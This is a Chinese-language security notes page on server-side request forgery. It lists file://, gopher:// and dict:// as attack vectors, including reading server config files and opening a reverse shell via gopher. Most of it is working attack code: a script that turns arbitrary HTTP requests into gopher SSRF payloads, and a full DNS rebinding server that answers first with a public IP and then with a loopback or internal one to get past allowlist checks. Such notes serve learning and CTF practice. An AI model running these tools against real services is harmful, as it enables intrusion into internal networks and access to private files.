---
title: SSRF
modDatetime: 2025-01-20T21:06:41.000+08:00
description: SSRF 常见协议、DNS rebinding 与内网探测利用记录
tags:
  - ssrf
---

[文章](https://www.freebuf.com/articles/web/333318.html)

**利用一个可以发起网络请求的服务当作跳板来访问并攻击内部其他服务**

SNI inject https://www.youtube.com/watch?v=2MslLrPinm0
TLS inject https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446

或gpt问

1. 介绍TLS poison进行ssrf的方法
2. 如何利用SNI injection实现ssrf

可用点：
**协议**
file:// 、gopher:// 、dict 、http 1. 其中file协议用于访问内网文件,比如apache配置文件 /etc/apache2/sites-enabled/000-default.conf，可以查看哪些端口是开放的, (其实访问的是file://localhost/etc/...) 2. gopher:// 协议可以发送post数据，还可以进行反向shell

```python
import urllib.parse
import re
from argparse import *

def gopher_encode(host, port, request):
    request = re.sub(r"\r?\n", "\r\n", request)
    result = urllib.parse.quote(request)
    return f"gopher://{host}:{port}/_{result}"

if(__name__ == "__main__"):
    parse = ArgumentParser(conflict_handler='resolve')
    parse.add_argument("-h", "--host", type=str, required=True, help="host to request")
    parse.add_argument("-p", "--port", type=str, required=True, help="port to request")
    parse.add_argument("-f", "--file", type=str, required=True, help="file with full request to encode")
    parse.add_argument("-e", "--encode", action="store_true", help="another url_encode after gopher_encode")
    args = parse.parse_args()

    with open(args.file, "r") as f:
        content = f.read()

    res = gopher_encode(args.host, args.port, content)

    if(args.encode):
        res = urllib.parse.quote(res)

    print(res)
```

本质上是

1. 先对请求进行url编码
2. 把%0a替换成%0d%0a
3. 对请求中进行url编码
   burpsuite会对请求自动进行url解码一次，因此用burpsuite要比用python多编码一次。用python可以省去最后一步

访问本地web服务时，默认使用80端口

## DNS 重绑定 rebinding

如果先进行域名解析判断是否是内网，或是否在允许网段，然后再进行请求
可以用dns重绑定绕过
关键：
TTL = 0，让目标系统不进行dns缓存
前后两次dns解析结果不一致，第二次解析到内网

```python
import socket
from dnslib import DNSRecord, RR, A, QTYPE

# 存储域名请求计数的字典
request_counts = {}

def solve_dns(data):
    try:
        request = DNSRecord.parse(data)
        reply = request.reply()
        q = request.get_q()
        qname = str(q.qname).rstrip('.').lower()

        # 获取并更新计数
        count = request_counts.get(qname, 0) + 1
        request_counts[qname] = count

        # 默认解析逻辑 (Rebinding 核心)
        # 格式: ipA-ipB.r.mekrina.tech
        parts = qname.split('.')
        resolved_ip = "127.0.0.1" # 默认 fallback 到回环

        if len(parts) > 3 and parts[-3] == 'r':
            try:
                ip_a = parts[0].replace('-', '.')
                ip_b = parts[1].replace('-', '.')

                # DNS Rebinding 策略：
                # 第一次返回公网 IP (A)，让浏览器认为这是安全合法的来源。
                # 之后的请求返回内网 IP (B)，让浏览器用 A 的授权去访问 B 的资源。
                resolved_ip = ip_a if count & 1 != 0 else ip_b

            except:
                resolved_ip = "8.8.8.8" if count & 1 != 0 else "127.0.0.1"
        else:
            resolved_ip = "8.8.8.8" if count & 1 != 0 else "127.0.0.1"

        print(f"[REBINDING] 域名: {qname} | 第 {count} 次请求 -> 返回: {resolved_ip}")
        # 优化点：TTL 设置为 0
        # 强制告诉客户端不要缓存，虽然浏览器会有最低限制，但这能触发更频繁的解析尝试
        reply.add_answer(RR(qname, QTYPE.A, rdata=A(resolved_ip), ttl=0))

        return reply.pack()

    except Exception as e:
        print(f"[!] 异常: {e}")
        return None

def main():
    host, port = '0.0.0.0', 53
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((host, port))
    print(f"DNS Rebinding Server 运行中...")

    while True:
        data, addr = sock.recvfrom(512)
        response = solve_dns(data)
        if response:
            sock.sendto(response, addr)

if __name__ == '__main__':
    main()
```
